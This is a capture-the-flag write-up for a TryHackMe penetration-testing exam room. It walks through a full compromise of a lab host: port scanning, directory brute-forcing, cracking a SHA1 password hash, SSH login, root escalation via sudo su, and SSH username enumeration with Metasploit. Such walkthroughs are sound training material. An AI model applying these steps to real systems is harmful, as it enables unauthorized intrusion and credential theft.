---
title: 'CC: Pen Testing'
date: 2020-07-28
---

- [Task 24 - Final Exam](#task-24---final-exam)
	- [nmap](#nmap)
	- [gobuster](#gobuster)
	- [hashcat](#hashcat)
	- [ssh](#ssh)
	- [privesc](#privesc)
	- [other findings](#other-findings)

[https://tryhackme.com/room/ccpentesting](https://tryhackme.com/room/ccpentesting)

## Task 24 - Final Exam

### nmap

[http://10.10.153.136/](http://10.10.153.136/) → Apache2 Ubuntu Default Page

```bash
$ nmap 10.10.153.136
22/tcp open  ssh
80/tcp open  http

$ nmap 10.10.153.136 -p22,80 -A -v
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```bash
$ gobuster dir -u 10.10.153.136 -w /usr/share/wordlists/dirb/common.txt
/secret (Status: 301)
```

[http://10.10.153.136/secret/](http://10.10.153.136/secret/) → blank :(

```bash
$ gobuster dir -u 10.10.153.136/secret -w /usr/share/wordlists/dirb/common.txt -x txt,php,pdf
/secret.txt (Status: 200)
```

[http://10.10.153.136/secret/secret.txt](http://10.10.153.136/secret/secret.txt) → nyan:046385855FC9580393853D8E81F240B66FE9A7B8

### hashcat

40 bits → SHA1?

```bash
hashcat -a0 -m100 hash rockyou.txt
046385855fc9580393853d8e81f240b66fe9a7b8:nyan
```

### ssh

```bash
$ ssh nyan@10.10.153.136 exit
nyan@10.10.153.136's password: nyan
nyan@ubuntu:~$ cat user.txt
```

### privesc

```bash
nyan@ubuntu:~$ find / -name id_rsa 2> /dev/null
# nothing

nyan@ubuntu:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
# nothing useful?

nyan@ubuntu:~$ crontab -l
no crontab for nyan

nyan@ubuntu:~$ sudo -l
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su

nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan# cat /root/root.txt 
```

### other findings

**nikto**

*found nothing useful*

**searchsploit/metasploit**

```bash
$ searchsploit OpenSSH 7.2p2
OpenSSH 7.2p2 - Username Enumeration  | linux/remote/40136.py
# Google -> CVE-2016-6210

$ msfconsole
msf5 > search 6210
msf5 > use auxiliary/scanner/ssh/ssh_enumusers
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.10.153.136
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE ~/SecLists/Usernames/top-usernames-shortlist.txt
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.10.153.136:22 - SSH - Using malformed packet technique
[*] 10.10.153.136:22 - SSH - Starting scan
[+] 10.10.153.136:22 - SSH - User 'root' found
[+] 10.10.153.136:22 - SSH - User 'admin' found
[+] 10.10.153.136:22 - SSH - User 'test' found
[+] 10.10.153.136:22 - SSH - User 'guest' found
[+] 10.10.153.136:22 - SSH - User 'info' found
[+] 10.10.153.136:22 - SSH - User 'adm' found
[+] 10.10.153.136:22 - SSH - User 'mysql' found
[+] 10.10.153.136:22 - SSH - User 'user' found
[+] 10.10.153.136:22 - SSH - User 'administrator' found
[+] 10.10.153.136:22 - SSH - User 'oracle' found
[+] 10.10.153.136:22 - SSH - User 'ftp' found
[+] 10.10.153.136:22 - SSH - User 'pi' found
[+] 10.10.153.136:22 - SSH - User 'puppet' found
[+] 10.10.153.136:22 - SSH - User 'ansible' found
[+] 10.10.153.136:22 - SSH - User 'ec2-user' found
[+] 10.10.153.136:22 - SSH - User 'vagrant' found
[+] 10.10.153.136:22 - SSH - User 'azureuser' found
```